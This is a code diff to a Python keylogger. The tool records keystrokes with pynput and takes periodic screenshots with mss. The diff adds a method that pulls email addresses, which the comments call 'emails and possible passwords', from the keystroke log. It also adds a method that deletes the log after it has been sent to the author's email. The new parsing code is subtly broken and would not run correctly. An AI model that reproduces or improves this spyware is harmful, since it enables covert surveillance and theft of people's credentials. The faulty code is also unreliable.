@@ -1,4 +1,5 @@
 import os
+import re
 import time
 from mss import mss
 from pynput.keyboard import Listener
@@ -17,7 +18,7 @@ class FrequencyTimer(Timer):
 class Keylogger:
 
     '''
-    this meathod takes a keylogger instance and a key and
+    this method takes a keylogger instance and a key and
     writes the key to a file
     @self : this instance of Keylogger
     @key : the key that was pressed
@@ -89,18 +90,37 @@ class Keylogger:
             listener.join()
     
     '''
-    this method is the main meathod to run a keylogger instance
+    this method is the main method to run a keylogger instance
     @self : this instance of Keylogger
     @frequency : interval for screenshots , default is 1
     '''
-    def exe(self, frequency = 1):
+    def exe(self, frequency = 3):
         self._setupDir()
         Thread(target=self._keyScript).start()
         FrequencyTimer(frequency, self._screenCapture).start()
-        
-    
-    
- #main: create Keylogger instance and run it
+        FrequencyTimer(30, self.parseFile).start()
+
+    '''
+    this method parses our log file for emails and possible passwords
+    and writes them to another file for easier reading
+    @self : this instance of Keylogger
+    '''    
+    def parseFile(self):
+        regex = re.compile(r'[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}')
+        with open('./log/keylog/log.txt', 'r') as file, open ('./log/keylog/parsed.txt', 'a+') as parsed:
+            for line in file:
+                result = regex.search(line)
+                parsed.write(result)
+                parsed.close()
+
+    '''
+    this method will wipe our log file after we send it to our email
+    (call from email function)
+    '''
+    def wipeFile(self):
+        os.remove('./log/keylog/log.txt')
+                
+#main: create Keylogger instance and run it
 if __name__== "__main__":
     keylist = [] #global list to format the output
     logger = Keylogger() # declare and intialze Keylogger object
